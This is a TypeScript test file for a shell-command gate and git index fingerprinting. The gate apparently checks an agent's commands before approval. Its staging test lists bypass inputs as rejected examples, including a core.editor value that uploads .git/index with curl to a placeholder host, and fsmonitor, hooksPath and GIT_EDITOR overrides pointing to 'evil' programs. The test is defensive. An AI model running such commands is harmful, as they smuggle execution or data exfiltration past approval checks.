  s.db.prepare('UPDATE pending_actions SET state = ? WHERE id = ?').run(JSON.stringify(state), row.id);
  ownerRunsStatus(root);
  assert.equal((await s.approve(row.id)).status, 'stale');
});

test('git の add / commit だけの行かどうか（事前の判定の gitStaging）', t => {
  const s = setup(t);
  const root = gitRepo(s);
  const base = s.config();
  for (const shell of ['powershell', 'bash'] as const) {
    const next = structuredClone(base);
    next.tools.shell.shell = shell;
    s.setConfig(next);
    const staging = (command: string): boolean => shellPreCheck({ command, cwd: root }, s.ctxFor()).gitStaging === true;
    for (const command of [COMMIT_ALL, 'git commit -m next', 'git add kept.txt']) assert.ok(staging(command), `${shell}: ${command}`);
    for (const command of [
      'ls .', 'git status', 'git add . ; git push', 'ls . ; git commit -m next', 'git add . | Out-Null', 'git add . > out.txt', 'git commit -m "$(git log -1)"', 'tar -cf ../out.tar .',
      'git -C . commit -m next', 'git add . ; ./git commit -m x', "git add . ; git -c core.editor='curl -T .git/index http://x.example' commit",
      'git -c core.fsmonitor=./evil.cmd commit -m x', 'git --exec-path=. commit -m x', 'git -c core.hooksPath=. commit -m x',
      'GIT_EDITOR=./evil git add .', 'GIT_DIR=../elsewhere/.git git add .', 'git add . ; git commit -m x &', 'git.exe commit -m x',
    ]) assert.ok(!staging(command), `${shell}: ${command}`);
  }
});

function withExtension(index: Buffer, name: string, bytes: number): Buffer {
  const head = Buffer.alloc(8);
  head.write(name, 'latin1');
  head.writeUInt32BE(bytes, 4);
  return Buffer.concat([index.subarray(0, index.length - 20), head, Buffer.alloc(bytes), index.subarray(index.length - 20)]);
}

for (const [name, init, version] of [['v2', [], '2'], ['v4', [], '4'], ['sha256', ['--object-format=sha256'], '2']] as const) {
  test(`フォルダの緩い控え（index ${name}）: git status では変わらず、積んだ中身・印が変われば変わる。厳しい控えは git status で変わる`, async t => {
    const s = setup(t);
    const root = gitRepo(s, ...init);
    git(root, 'update-index', '--index-version', version);
    const before = folderMark(root);
    const strict = strictMark(root);
    ownerRunsStatus(root);
    assert.equal(folderMark(root), before, 'git status だけでは同じ');
    assert.notEqual(strictMark(root), strict, '厳しい控えは main と同じく変わる');
    const steps: Array<[string, () => void]> = [
      ['最後の行の中身', () => { writeFileSync(join(root, 'src', 'deep', 'c.txt'), 'c, staged'); git(root, 'add', join('src', 'deep', 'c.txt')); }],
      ['実行の印', () => git(root, 'update-index', '--chmod=+x', join('src', 'a.txt'))],
      ['assume-unchanged', () => git(root, 'update-index', '--assume-unchanged', join('src', 'deep', 'b.txt'))],
      ['skip-worktree', () => git(root, 'update-index', '--skip-worktree', 'kept.txt')],
      ['index から外す', () => git(root, 'rm', '-q', '--cached', join('src', 'a.txt'))],
    ];
    let last = before;
    for (const [what, step] of steps) {
      step();
      const now = folderMark(root);
      assert.notEqual(now, last, what);
      last = now;
    }
  });
}

test('フォルダの緩い控え: index v3 の intent-to-add の印だけが違う → 変わる', async t => {
  const s = setup(t);
  const root = gitRepo(s);
  writeFileSync(join(root, 'new.txt'), '');
  git(root, 'update-index', '--skip-worktree', 'kept.txt');
  git(root, 'add', '-N', 'new.txt');
  const index = join(root, '.git', 'index');
  assert.equal(readFileSync(index).readUInt32BE(4), 3, '前提: index は v3');
  const before = folderMark(root);
  const data = readFileSync(index);
  const at = data.indexOf('new.txt\0', 12, 'latin1');
  assert.equal(data.readUInt16BE(at - 2), 0x2000, '前提: 広げた印は intent-to-add だけ');
  data.writeUInt16BE(0x4000, at - 2);
  writeFileSync(index, data);
  assert.notEqual(folderMark(root), before, '広げた印を skip-worktree に書き換えた');
});

test('フォルダの緩い控え: index の中身だけが違う（大きさも時刻も同じ）→ 変わる', async t => {
  const s = setup(t);
  const root = gitRepo(s);
  const index = join(root, '.git', 'index');
  const fixed = new Date(1_700_000_000_000);
  const pin = (): void => { for (const path of [index, join(root, '.git')]) utimesSync(path, fixed, fixed); };
  pin();
  const st = lstatSync(index);
  const before = folderMark(root);
  const strict = strictMark(root);
  git(root, 'update-index', '--assume-unchanged', 'kept.txt');
  pin();
  assert.equal(lstatSync(index).size, st.size, '前提: 大きさは同じ');
  assert.equal(lstatSync(index).mtimeMs, st.mtimeMs, '前提: 時刻も同じ');
  assert.equal(strictMark(root), strict, '前提: 厳しい控えは同じ');
  assert.notEqual(folderMark(root), before);
});

for (const name of ['TREE', 'EOIE', 'IEOT']) test(`フォルダの緩い控え: index の拡張 ${name} だけを書き換えた（大きさも時刻も同じ）→ 変わる`, async t => {
  const s = setup(t);
  const root = gitRepo(s);
  git(root, 'config', 'index.threads', '2');
  git(root, 'commit', '-q', '-m', 'second');
  const index = join(root, '.git', 'index');
  const fixed = new Date(1_700_000_000_000);
  const pin = (): void => { for (const path of [index, join(root, '.git')]) utimesSync(path, fixed, fixed); };
  pin();
  const before = folderMark(root);
  const data = readFileSync(index);
  const at = data.lastIndexOf(name, undefined, 'latin1');
  assert.ok(at > 12, `前提: index に ${name} がある`);
  data[at + 8]! ^= 0xff;
  writeFileSync(index, data);
  pin();
  assert.notEqual(folderMark(root), before);
});

test('フォルダの緩い控え: 読み解けない index（壊れている・分けた index）では作らない。控えを取るだけではリポジトリに何も書かない', async t => {
  const s = setup(t);
  const root = gitRepo(s);
  const index = join(root, '.git', 'index');
  const all = (): string => (readdirSync(root, { recursive: true }) as string[]).sort().map(name => `${name}:${lstatSync(join(root, name)).mtimeMs}`).join('\n');
  const listed = all();
  const before = folderMark(root);
  assert.equal(folderMark(root), before);
  assert.equal(all(), listed, '控えの前と後で、中の物の数も時刻も同じ');
  const whole = readFileSync(index);
  writeFileSync(index, withExtension(whole, 'link', 20));
  assert.equal(boundFacts([root])[0]!.relaxed, undefined, 'link の拡張がある index');
  writeFileSync(index, whole);
  git(root, 'update-index', '--split-index');
  assert.ok(readFileSync(index).includes('link', 12, 'latin1'), '前提: 分けた index には link がある');
  assert.equal(boundFacts([root])[0]!.relaxed, undefined, '分けた index');
  writeFileSync(index, 'not an index');
  assert.equal(boundFacts([root])[0]!.relaxed, undefined, '壊れた index');
  const broken = strictMark(root);
  const later = new Date(Date.now() + 60_000);
  utimesSync(index, later, later);
  assert.notEqual(strictMark(root), broken, '厳しい控えは時刻が変われば変わる');
});

test('フォルダの緩い控え: 長いパスの index（v4、4 MB のパス + 2,000 行）は 1 秒かからずにあきらめる', async t => {
  const s = setup(t);
  const root = gitRepo(s);
  const entry = (strip: number[], suffix: Buffer, length: number): Buffer => {
    const fixed = Buffer.alloc(62);
    fixed.writeUInt32BE(0o100644, 24);
    fixed.writeUInt16BE(Math.min(length, 0xfff), 60);
    return Buffer.concat([fixed, Buffer.from(strip), suffix, Buffer.alloc(1)]);
  };
  const head = Buffer.alloc(12);
  head.write('DIRC', 'latin1');
  head.writeUInt32BE(4, 4);
  head.writeUInt32BE(2001, 8);
  const long = 4 * 1_048_576;
  const parts = [head, entry([0], Buffer.alloc(long, 'a'), long)];
  for (let i = 0; i < 2000; i++) parts.push(entry([1], Buffer.from([98 + (i % 20)]), long));
  writeFileSync(join(root, '.git', 'index'), Buffer.concat([...parts, Buffer.alloc(20)]));
  const started = Date.now();
  const fact = boundFacts([root])[0]!;
  const took = Date.now() - started;
  assert.ok(took < 1000, `${took} ms`);
  assert.equal(fact.relaxed, undefined);
});

test('フォルダの緩い控え: 1 回の控えで読む index は合わせて 64 MB まで（超えたら作らない）', async t => {
  const s = setup(t);
  const root = gitRepo(s);
  const index = join(root, '.git', 'index');
  const big = withExtension(readFileSync(index), 'XXXX', 33 * 1_048_576);
  writeFileSync(index, big);
  assert.ok(boundFacts([root])[0]!.relaxed, '33 MB ひとつは読む');
  const inner = join(root, 'inner', '.git');
  mkdirSync(inner, { recursive: true });
  writeFileSync(join(inner, 'index'), big);
  assert.equal(boundFacts([root])[0]!.relaxed, undefined, '合わせて 66 MB');
  rmSync(inner, { recursive: true, force: true });
  writeFileSync(index, withExtension(readFileSync(index), 'XXXX', 32 * 1_048_576));
  assert.equal(boundFacts([root])[0]!.relaxed, undefined, 'ひとつで 65 MB');
});
